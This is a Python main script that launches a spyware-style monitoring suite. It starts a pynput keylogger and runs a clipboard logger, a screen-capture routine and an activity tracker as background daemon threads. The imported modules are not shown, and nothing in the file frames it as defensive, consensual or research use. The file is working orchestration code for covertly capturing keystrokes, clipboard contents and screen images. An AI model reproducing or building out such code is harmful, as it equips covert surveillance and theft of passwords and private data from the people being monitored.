import threading
from pynput import keyboard
from keylogger import on_press
from clipboard import log_clipboard
from screen_capture import capture_screen
from activity_tracker import track_activity

if __name__ == "__main__":
    # Start keylogger
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # Start clipboard logger
    clipboard_thread = threading.Thread(target=log_clipboard)
    clipboard_thread.daemon = True
    clipboard_thread.start()

    # Start screen capture
    screen_thread = threading.Thread(target=capture_screen)
    screen_thread.daemon = True
    screen_thread.start()

    # Start activity tracker
    activity_thread = threading.Thread(target=track_activity)
    activity_thread.daemon = True
    activity_thread.start()

    # Keep everything running
    listener.join()